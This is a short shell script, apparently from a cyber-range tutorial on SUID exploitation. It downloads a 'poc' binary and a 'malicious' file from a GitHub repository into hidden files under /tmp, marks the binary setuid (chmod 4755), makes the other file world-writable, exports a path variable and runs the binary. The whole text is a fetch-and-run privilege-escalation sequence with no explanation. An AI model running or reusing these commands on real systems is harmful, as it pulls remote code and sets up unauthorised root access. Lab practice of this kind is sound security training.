wget -O /tmp/.poc https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/poc; 
wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/malicious; 

chmod 4755 /tmp/.poc;
chmod 777 /tmp/.malicious; 
export BAD_PATH=/tmp; 
cd /tmp/; 
.poc